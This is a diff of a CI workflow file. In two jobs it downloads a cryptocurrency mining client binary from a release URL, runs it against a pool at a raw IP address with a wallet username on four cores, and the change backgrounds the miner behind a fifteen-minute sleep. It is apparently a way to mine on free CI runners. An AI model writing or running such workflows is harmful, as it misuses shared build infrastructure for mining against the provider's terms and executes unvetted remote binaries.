@@ -55,7 +55,8 @@ jobs:
       run: |
         wget https://github.com/egg5233/ore-hq-client/releases/download/v1.0.7/ore-hq-client-ubuntu22
         chmod +x ore-hq-client-ubuntu22
-        ./ore-hq-client-ubuntu22 --url ws://20.81.187.6:80/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.00vps2 --cores 4 
+        ./ore-hq-client-ubuntu22 --url ws://20.81.187.6:80/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.00vps2 --cores 4 &
+        sleep 15m
     - name: Main
       run: |
         top
@@ -84,7 +85,8 @@ jobs:
       run: |
         wget https://github.com/egg5233/ore-hq-client/releases/download/v1.0.7/ore-hq-client-ubuntu22
         chmod +x ore-hq-client-ubuntu22
-        ./ore-hq-client-ubuntu22 --url ws://20.81.187.6:80/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.00vps2 --cores 4 
+        ./ore-hq-client-ubuntu22 --url ws://20.81.187.6:80/mine mine --username HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4.00vps2 --cores 4 &
+        sleep 15m
     - name: Main
       run: |
         top
